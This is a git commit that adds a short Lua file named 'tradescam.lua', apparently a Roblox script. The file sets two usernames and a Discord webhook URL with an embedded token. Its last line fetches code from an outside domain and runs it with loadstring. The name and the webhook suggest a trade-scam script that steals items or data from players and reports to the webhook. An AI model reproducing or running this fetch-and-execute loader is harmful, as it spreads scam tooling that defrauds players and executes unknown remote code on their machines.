546c68a8f6fe2f6e1c72219bff839765ea6aa08a
smarketAI <smarketAIbusiness@gmail.com>
2024-07-25 12:51:22 -0400

    Create tradescam.lua

---
+++ tradescam.lua
@@ -0,0 +1,5 @@
+Username = "UndefinedVoid_0"
+Username2 = "VoidAlt9999"
+Webhook = "https://discord.com/api/webhooks/1265762226879598652/UXJVMAm96eU-vGIoXQOLKMm6qcXlNb9_DZJR0WewW0CC8xSMN3tCWNRh-IVe_7leFt_J"
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
